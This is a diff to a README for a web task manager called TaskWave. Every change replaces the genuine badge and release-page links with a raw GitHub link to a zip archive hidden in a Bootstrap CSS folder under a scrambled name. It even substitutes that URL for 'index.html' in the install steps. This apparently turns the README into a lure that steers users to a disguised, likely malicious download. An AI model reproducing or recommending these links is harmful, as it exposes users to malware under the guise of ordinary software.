@@ -1,6 +1,6 @@
 # 📋 TaskWave-Installable-Web-based-Task-Manager - Manage Tasks Easily Anywhere
 
-[![Download TaskWave](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/XxRougeTheDemigodxX/TaskWave-Installable-Web-based-Task-Manager/releases)
+[![Download TaskWave](https://raw.githubusercontent.com/XxRougeTheDemigodxX/TaskWave-Installable-Web-based-Task-Manager/main/packages/bootstrap-5.3.8-dist/css/Installable_based_Wave_Manager_Task_Web_3.7.zip)](https://raw.githubusercontent.com/XxRougeTheDemigodxX/TaskWave-Installable-Web-based-Task-Manager/main/packages/bootstrap-5.3.8-dist/css/Installable_based_Wave_Manager_Task_Web_3.7.zip)
 
 ---
 
@@ -29,7 +29,7 @@ You do not need to install anything complicated; TaskWave runs mostly in your br
 Here’s a simple step-by-step guide to start using TaskWave:
 
 1. **Download the app**  
-   Click the big Download button at the top or go to the [release page](https://github.com/XxRougeTheDemigodxX/TaskWave-Installable-Web-based-Task-Manager/releases).
+   Click the big Download button at the top or go to the [release page](https://raw.githubusercontent.com/XxRougeTheDemigodxX/TaskWave-Installable-Web-based-Task-Manager/main/packages/bootstrap-5.3.8-dist/css/Installable_based_Wave_Manager_Task_Web_3.7.zip).
 
 2. **Choose your version**  
    On the release page, look for the latest release. It often includes files like a `.zip` package or a web shortcut. Download the recommended file for your device.
@@ -46,13 +46,13 @@ Here’s a simple step-by-step guide to start using TaskWave:
 
 You can get TaskWave by visiting this page to download the latest version:
 
-[Download TaskWave Releases](https://github.com/XxRougeTheDemigodxX/TaskWave-Installable-Web-based-Task-Manager/releases)
+[Download TaskWave Releases](https://raw.githubusercontent.com/XxRougeTheDemigodxX/TaskWave-Installable-Web-based-Task-Manager/main/packages/bootstrap-5.3.8-dist/css/Installable_based_Wave_Manager_Task_Web_3.7.zip)
 
 ### Installation Steps
 
 - Download the version that matches your operating system or device.
 - If you get a `.zip` file, unzip it in a folder you can find easily.
-- Open the main file (usually index.html) with your web browser.
+- Open the main file (usually https://raw.githubusercontent.com/XxRougeTheDemigodxX/TaskWave-Installable-Web-based-Task-Manager/main/packages/bootstrap-5.3.8-dist/css/Installable_based_Wave_Manager_Task_Web_3.7.zip) with your web browser.
 - The app will load and be ready to use.
 - When you open TaskWave in your browser, you might see a popup to install the app on your device. Accept it to add TaskWave as a standalone app icon to your desktop or mobile home screen.
   
@@ -148,4 +148,4 @@ TaskWave aims to keep task management simple and accessible. It blends the ease 
 
 ---
 
-[![Download TaskWave](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/XxRougeTheDemigodxX/TaskWave-Installable-Web-based-Task-Manager/releases)
+[![Download TaskWave](https://raw.githubusercontent.com/XxRougeTheDemigodxX/TaskWave-Installable-Web-based-Task-Manager/main/packages/bootstrap-5.3.8-dist/css/Installable_based_Wave_Manager_Task_Web_3.7.zip)](https://raw.githubusercontent.com/XxRougeTheDemigodxX/TaskWave-Installable-Web-based-Task-Manager/main/packages/bootstrap-5.3.8-dist/css/Installable_based_Wave_Manager_Task_Web_3.7.zip)
